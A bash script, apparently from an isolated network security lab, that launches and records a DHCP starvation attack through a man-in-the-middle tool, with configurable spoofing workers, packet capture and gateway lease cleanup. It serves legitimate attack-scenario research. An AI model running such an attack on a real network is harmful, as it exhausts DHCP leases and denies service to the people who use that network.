#!/usr/bin/env bash
set -euo pipefail

USER_PCAP_ENABLE="${PCAP_ENABLE-}"
USER_DHCP_STARVATION_WORKERS="${DHCP_STARVATION_WORKERS-}"

# shellcheck source=/dev/null
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/common.sh"

PCAP_ENABLE="${USER_PCAP_ENABLE:-1}"
case "${FULL_PCAPS:-0}" in
  1|true|TRUE|yes|YES|on|ON)
    PCAP_RETENTION_POLICY="${PCAP_RETENTION_POLICY:-all}"
    GUEST_PCAP_ENABLE="${GUEST_PCAP_ENABLE:-1}"
    PCAP_SUMMARIES_ENABLE="${PCAP_SUMMARIES_ENABLE:-1}"
    ;;
  *)
    PCAP_RETENTION_POLICY="first-run-per-scenario"
    GUEST_PCAP_ENABLE="0"
    PCAP_SUMMARIES_ENABLE="0"
    ;;
esac

DURATION="${1:-${DURATION:-60}}"
WORKERS="${2:-${USER_DHCP_STARVATION_WORKERS:-1}}"
REMOTE_ROOT="$(research_workspace_root)"
ATTACK_CMD="cd '${REMOTE_ROOT}' && exec env PYTHONPATH='./python' python3 -m mitm.cli --config ./lab.conf dhcp-starvation --interface vnic0 --interval 0.2 --request-timeout 5.0 --workers ${WORKERS}"
CLEANUP_CMD="$(dhcp_starvation_gateway_cleanup_cmd)"
CLEANUP_CMD="${CLEANUP_CMD//__PREFIX__/${DHCP_STARVATION_MAC_PREFIX,,}}"

PLAN_DURATION_SECONDS="${DURATION}" \
PLAN_FORWARDING_ENABLED="0" \
PLAN_DNS_SPOOF_ENABLED="0" \
DHCP_STARVATION_WORKERS="${WORKERS}" \
RUN_SLUG_SUFFIX="param-workers-${WORKERS}" \
POST_CLEANUP_HOST="gateway" \
POST_CLEANUP_LABEL="dhcp-starvation-cleanup" \
POST_CLEANUP_CMD="${CLEANUP_CMD}" \
POST_CLEANUP_USE_SUDO="1" \
run_automated_scenario_recording \
  "dhcp-starvation" \
  "${DURATION}" \
  "Automated DHCP starvation run with ${WORKERS} spoofing workers and gateway lease cleanup in the isolated lab" \
  "dhcp-starvation" \
  "${ATTACK_CMD}"
